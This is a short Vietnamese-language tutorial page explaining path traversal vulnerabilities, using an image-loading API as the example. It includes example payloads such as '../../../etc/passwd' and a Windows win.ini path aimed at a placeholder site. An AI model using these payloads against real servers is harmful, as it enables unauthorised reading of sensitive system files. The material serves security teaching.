<h1>Path Traversal</h1>
<h2>1. Path Traversal là gì? (Directory Traversal)</h2>
<p>Path traversal là lỗ hổng cho phép attacker đọc các file tùy ý trên server (arbitrary file read).</p>
<p>Nếu nặng hơn, attacker còn có thể ghi file, sửa cấu hình → chiếm quyền điều khiển server.</p>

<h2>2. Khai thác</h2>
<p>Ứng dụng thường cho phép người dùng gửi tên file để server mở.</p>
<p>Ví dụ shop có API tải ảnh:</p>
<pre>&ltimg src="/loadImage?filename=218.png"&gt</pre>
<p>Server sẽ thực hiện nội bộ: <code>/var/www/images/ + filename</code> → <code>/var/www/images/218.png</code></p>
<p>Nếu không kiểm soát input, attacker có thể chèn chuỗi:</p>
<pre>../../../etc/passwd</pre>
<p>Server nối lại và tạo thành:</p>
<pre>/var/www/images/../../../etc/passwd</pre>
<p>Kết quả: file nhạy cảm bị đọc ra.</p>

<h2>3. Payload</h2>
<p><b>UNIX</b></p>
<pre>https://insecure-website.com/loadImage?filename=../../../etc/passwd</pre>
<p><b>Windows</b></p>
<pre>https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini</pre>
